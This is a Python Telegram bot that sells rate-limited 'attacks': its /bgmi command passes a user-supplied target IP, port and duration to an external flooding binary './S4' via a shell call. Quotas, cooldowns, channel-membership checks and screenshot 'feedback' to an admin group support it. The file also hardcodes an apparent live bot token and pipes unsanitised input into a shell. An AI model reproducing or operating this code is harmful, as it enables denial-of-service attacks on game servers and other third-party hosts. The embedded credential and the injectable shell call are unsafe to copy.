import telebot
import subprocess
import datetime
from keep_alive import keep_alive
import os

# Keep the bot alive (for hosting purposes)

# Bot initialization
BOT_TOKEN = "7706816535:AAFjqNpIf-LjKRpuA7JfLTq0FGOrNq4J4Xc"  # Replace with your bot token
bot = telebot.TeleBot(BOT_TOKEN)

# Admin IDs
admin_id = ["6769245930"]  # Replace with your Telegram user ID

# Group ID where feedback will be forwarded
GROUP_ID = "-1002487517182"  # Replace with your group chat ID

# Channel ID to verify user membership
CHANNEL_ID = "@S4xOFFICIALxGRP"  # Replace with your channel username

# File paths
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Constants
default_max_daily_attacks = 5  # Default maximum allowed attacks per user per day
default_cooldown_time = 2  # Default cooldown time in seconds (4 minutes)

# Variables
allowed_user_ids = []
user_attack_count = {}
last_attack_time = {}  # Track the time of the last attack for cooldown
user_feedback_state = {}  # Track whether the user provided feedback after the last attack
user_attack_limits = {}  # Track custom attack limits for each user
current_cooldown_time = default_cooldown_time  # Set initial cooldown time to default

# Track bot start time
bot_start_time = datetime.datetime.now()

# Load allowed users from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Log commands
def log_command(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    except:
        username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        log_entry = f"Username: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration} seconds"
        file.write(log_entry + "\n\n")

# Command: /bgmi (User attack with cooldown and feedback enforcement)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        if user_feedback_state.get(user_id) == "pending":
            bot.reply_to(message, "You must provide feedback for your previous attack before starting a new one. Send a JPG screenshot as feedback.")
            return

        try:
            member = bot.get_chat_member(CHANNEL_ID, user_id)
            if member.status in ['member', 'administrator']:
                current_time = datetime.datetime.now()
                last_time = last_attack_time.get(user_id, None)

                if last_time:
                    time_diff = (current_time - last_time).total_seconds()
                    if time_diff < current_cooldown_time:
                        remaining_time = current_cooldown_time - time_diff
                        bot.reply_to(message, f"Cooldown active! Wait {int(remaining_time)} seconds.")
                        return

                # Get the custom or default attack limit
                max_attacks = user_attack_limits.get(user_id, default_max_daily_attacks)

                attacks_today = user_attack_count.get(user_id, 0)
                if attacks_today >= max_attacks:
                    bot.reply_to(message, f"Daily attack limit reached. You can only make {max_attacks} attacks per day.")
                    return

                command = message.text.split()
                if len(command) != 4:
                    bot.reply_to(message, "Usage: /bgmi <target> <port> <duration>. Example: /bgmi 192.168.0.1 80 60")
                    return

                target, port, duration = command[1], int(command[2]), int(command[3])

                if duration > 240:
                    bot.reply_to(message, "Maximum allowed duration is 240 seconds.")
                    return

                log_command(user_id, target, port, duration)
                user_attack_count[user_id] = attacks_today + 1
                last_attack_time[user_id] = current_time

                bot.reply_to(message, f"Attack started on {target}:{port} for {duration} seconds.")
                subprocess.run(f"./S4 {target} {port} {duration} 100 ", shell=True)

                bot.reply_to(message, "Attack completed successfully!")

                # Mark feedback as pending
                user_feedback_state[user_id] = "pending"
                bot.send_message(user_id, "Please provide feedback for the last attack by sending a JPG screenshot.")
            else:
                bot.reply_to(message, f"Please join the channel {CHANNEL_ID} to use this command.")
        except Exception as e:
            bot.reply_to(message, f"Error verifying membership: {e}")
    else:
        bot.reply_to(message, "You are not authorized to use this bot.")

# Handle JPG feedback
@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.chat.id)

    if user_feedback_state.get(user_id) == "pending":
        try:
            # Save the photo to the server
            file_info = bot.get_file(message.photo[-1].file_id)  # Get the highest resolution photo
            downloaded_file = bot.download_file(file_info.file_path)
            feedback_file_path = f"{user_id}_feedback.jpg"

            with open(feedback_file_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            # Forward the feedback to the group
            bot.send_photo(GROUP_ID, photo=open(feedback_file_path, 'rb'), caption=f"Feedback from UserID: {user_id}")

            # Acknowledge the user
            bot.reply_to(message, "Thank you for your feedback! You can now start a new attack.")

            # Mark feedback as completed
            user_feedback_state[user_id] = "completed"

            # Clean up local file
            os.remove(feedback_file_path)
        except Exception as e:
            bot.reply_to(message, f"Error saving feedback: {e}")
    else:
        bot.reply_to(message, "You are not required to send feedback at this moment.")

# Reject non-photo feedback
@bot.message_handler(func=lambda message: user_feedback_state.get(message.chat.id) == "pending" and message.content_type != 'photo')
def reject_feedback(message):
    bot.reply_to(message, "Invalid feedback! Please send a JPG screenshot as feedback.")

# Command: /check (Show both bot status and user status)
@bot.message_handler(commands=['check'])
def handle_check(message):
    user_id = str(message.chat.id)
    is_admin = user_id in admin_id

    # Bot Uptime
    current_time = datetime.datetime.now()
    uptime = current_time - bot_start_time
    uptime_str = str(uptime).split(".")[0]  # Format uptime without microseconds

    # Bot Stats
    total_users = len(allowed_user_ids)
    total_attacks_today = sum(user_attack_count.values())
    log_file_size = os.path.getsize(LOG_FILE) / 1024 if os.path.exists(LOG_FILE) else 0

    bot_status = (
        f"🤖 **Bot Status**:\n"
        f"🕒 Uptime: {uptime_str}\n"
        f"👥 Total Allowed Users: {total_users}\n"
        f"⚡ Total Attacks Today: {total_attacks_today}\n"
        f"📂 Log File Size: {log_file_size:.2f} KB\n"
    )

    # User-Specific Stats
    if user_id in allowed_user_ids:
        last_time = last_attack_time.get(user_id, None)
        cooldown_remaining = max(0, current_cooldown_time - (current_time - last_time).total_seconds()) if last_time else 0
        attacks_today = user_attack_count.get(user_id, 0)
        remaining_attacks = max(0, user_attack_limits.get(user_id, default_max_daily_attacks) - attacks_today)
        feedback_status = user_feedback_state.get(user_id, "No feedback required")

        user_status = (
            f"👤 **User Status**:\n"
            f"🔢 User ID: {user_id}\n"
            f"⚡ Attacks Today: {attacks_today}/{user_attack_limits.get(user_id, default_max_daily_attacks)}\n"
            f"⏳ Cooldown Remaining: {int(cooldown_remaining)} seconds\n"
            f"📤 Feedback Status: {feedback_status}\n"
            f"⚙️ Remaining Attacks: {remaining_attacks} attacks left today\n"
        )
    else:
        user_status = "❌ You are not authorized to use this bot."

    # Combine bot and user status
    if is_admin:
        status_message = bot_status + "\n" + user_status
    else:
        status_message = user_status

    # Send status message
    bot.reply_to(message, status_message)

# Admin command to set custom attack limit for user
@bot.message_handler(commands=['set_attack_limit'])
def set_attack_limit(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            # Get user ID and new attack limit from the command
            command = message.text.split()
            if len(command) != 3 or not command[2].isdigit():
                bot.reply_to(message, "Usage: /set_attack_limit <user_id> <new_limit>. Example: /set_attack_limit 1234567890 10")
                return

            target_user_id = command[1]
            new_limit = int(command[2])

            # Set the custom attack limit for the user
            user_attack_limits[target_user_id] = new_limit

            bot.reply_to(message, f"Custom attack limit for UserID {target_user_id} has been set to {new_limit}.")
        except Exception as e:
            bot.reply_to(message, f"Error setting attack limit: {e}")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Command: /help (Show all bot commands)
@bot.message_handler(commands=['help'])
def handle_help(message):
    help_text = (
        "Here are the available commands:\n\n"
        "/bgmi <target> <port> <duration> - Start an attack on the specified target and port for the specified duration.\n"
        "/check - Show both bot status and your user status.\n"
        "/set_attack_limit <user_id> <new_limit> - Set a custom attack limit for a user (admin only).\n"
        "/help - Show this help message with all commands.\n"
    )
    bot.reply_to(message, help_text)

# Start polling
print("Bot is running...")
bot.infinity_polling()
